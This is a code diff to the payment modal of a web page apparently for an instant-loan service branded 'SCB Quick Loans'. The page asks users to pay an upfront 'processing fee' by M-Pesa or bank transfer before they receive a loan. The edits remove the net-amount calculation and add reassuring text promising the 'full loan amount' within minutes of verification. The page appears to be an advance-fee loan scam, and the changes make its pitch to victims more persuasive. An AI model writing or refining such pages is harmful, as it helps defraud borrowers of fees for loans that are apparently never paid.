@@ -580,7 +580,7 @@
             padding: 30px;
         }
         
-        /* New styles for improved loan summary */
+        /* Updated styles for loan summary with correct math */
         .loan-summary {
             background: linear-gradient(135deg, #f0f9ff 0%, #e6f2f9 100%);
             border-radius: 12px;
@@ -650,10 +650,6 @@
         .important-notice p {
             margin: 0;
             line-height: 1.5;
-        }
-        
-        .important-notice strong {
-            color: #1e40af;
         }
         
         .bank-details-grid {
@@ -1162,7 +1158,7 @@
         <p>Contact: <a href="mailto:support@scbquickloans.co.ke">support@scbquickloans.co.ke</a></p>
     </div>
     
-    <!-- IMPROVED PAYMENT MODAL with Clear Messaging -->
+    <!-- IMPROVED PAYMENT MODAL with Corrected Math -->
     <div class="modal" id="paymentModal">
         <div class="modal-content">
             <div class="modal-header">
@@ -1171,7 +1167,7 @@
                 <p>Pay the processing fee to receive your loan</p>
             </div>
             <div class="modal-body">
-                <!-- Loan Amount Summary - Shows the full picture -->
+                <!-- Loan Amount Summary - CORRECTED: User receives FULL loan amount -->
                 <div class="loan-summary">
                     <div class="summary-row">
                         <span class="label">You qualify for:</span>
@@ -1182,15 +1178,16 @@
                         <span class="value" id="modalPaymentAmount">KSh 0</span>
                     </div>
                     <div class="summary-total">
-                        <span class="label">You will receive:</span>
-                        <span class="value" id="modalNetAmount">KSh 0</span>
+                        <span class="label">After verification, you will receive:</span>
+                        <span class="value" id="modalFullLoanAmount">KSh 0</span>
                     </div>
                 </div>
                 
-                <!-- Important Notice - Explains the process -->
+                <!-- Important Notice - Explains the process correctly -->
                 <div class="important-notice">
                     <strong>📌 How it works:</strong>
-                    <p>Pay the processing fee below to activate your loan. Once verified, the full loan amount of <strong id="modalLoanAmount2">KSh 0</strong> will be sent to your M-Pesa number within minutes.</p>
+                    <p>Pay the processing fee of <strong id="modalPaymentAmount2">KSh 0</strong> to activate your loan. Once verified, the <strong>full loan amount of <span id="modalLoanAmount2">KSh 0</span></strong> will be sent to your M-Pesa number within minutes.</p>
+                    <p style="margin-top: 10px; font-weight: 500;">The processing fee is separate and covers credit assessment & verification costs.</p>
                 </div>
                 
                 <!-- Bank Details with Copy Buttons -->
@@ -1279,7 +1276,7 @@
                     SUBMIT FOR VERIFICATION
                 </button>
                 
-                <!-- Verification Notice with Loan Amount -->
+                <!-- Verification Notice with Correct Loan Amount -->
                 <div class="verification-notice" style="margin-top: 15px;">
                     <p style="margin: 0;">Your application will be verified within 5-10 minutes. Once approved, <strong id="modalLoanAmount3">KSh 0</strong> will be sent to your M-Pesa.</p>
                 </div>
@@ -1883,7 +1880,7 @@
             applyBtn.disabled = !(acceptTnc.checked && hasScanned && qualifiedAmount > 0 && isBindingValid);
         }
         
-        // ================ IMPROVED: Payment Modal Functions ================
+        // ================ CORRECTED: Payment Modal Functions ================
         
         function openPaymentModal() {
             const phoneNumber = document.getElementById('phoneNumber').value.trim();
@@ -1903,14 +1900,13 @@
                 return;
             }
             
-            const netAmount = qualifiedAmount - processingFee;
-            
-            // Update modal with all amounts
+            // Update modal with correct amounts - USER RECEIVES FULL LOAN AMOUNT
             document.getElementById('modalLoanAmount').textContent = `KSh ${qualifiedAmount.toLocaleString()}`;
             document.getElementById('modalLoanAmount2').textContent = `KSh ${qualifiedAmount.toLocaleString()}`;
             document.getElementById('modalLoanAmount3').textContent = `KSh ${qualifiedAmount.toLocaleString()}`;
+            document.getElementById('modalFullLoanAmount').textContent = `KSh ${qualifiedAmount.toLocaleString()}`;
             document.getElementById('modalPaymentAmount').textContent = `KSh ${processingFee.toLocaleString()}`;
-            document.getElementById('modalNetAmount').textContent = `KSh ${netAmount.toLocaleString()}`;
+            document.getElementById('modalPaymentAmount2').textContent = `KSh ${processingFee.toLocaleString()}`;
             document.getElementById('instructionAmount').textContent = `KSh ${processingFee.toLocaleString()}`;
             document.getElementById('copyAmount').textContent = processingFee;
             document.getElementById('paymentModal').style.display = 'flex';
